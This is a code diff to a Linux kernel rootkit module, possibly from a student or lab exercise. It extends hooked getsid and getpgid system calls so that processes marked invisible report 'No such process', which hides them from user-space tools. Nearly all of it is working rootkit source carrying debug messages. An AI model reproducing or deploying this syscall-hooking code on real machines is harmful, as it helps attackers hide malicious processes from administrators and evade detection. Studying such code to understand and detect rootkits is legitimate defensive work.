@@ -128,15 +128,31 @@ is_invisible(pid_t pid)
 }
 
 asmlinkage int hacked_getsid(pid_t pid) {
-    // If you want to hide certain PIDs, add logic here.
-    // For now, just pass through.
-	printk("ROOTKITS: hacked_getsid\n");
+    // Add your debug message
+    printk(KERN_INFO "ROOTKITS: hacked_getsid called with pid=%d\n", pid);
+	printk(KERN_INFO "ROOTKITS: is_invisible(pid) = %d\n", is_invisible(pid));
+
+	if (is_invisible(pid)) {
+        // Return -ESRCH so user space sees "No such process"
+		printk("Rootkit: is_invisive, return ERSCH\n");
+        return -ESRCH;
+    }
+    // Call the original getsid syscall
     return orig_getsid(pid);
 }
 
 asmlinkage int hacked_getpgid(pid_t pid) {
-    // Similar logic as getsid.
-	printk("ROOTKITS: hacked_getpgid\n");
+    // Add your debug message
+    printk(KERN_INFO "ROOTKITS: hacked_getpgid called with pid=%d\n", pid);
+
+	printk(KERN_INFO "ROOTKITS: is_invisible(pid) = %d\n", is_invisible(pid));
+    if (is_invisible(pid)) {
+        // Return -ESRCH so user space sees "No such process"
+		printk("Rootkit: is_invlisive, return ERSCH\n");
+        return -ESRCH;
+    }
+
+    // Call the original getpgid syscall
     return orig_getpgid(pid);
 }
 
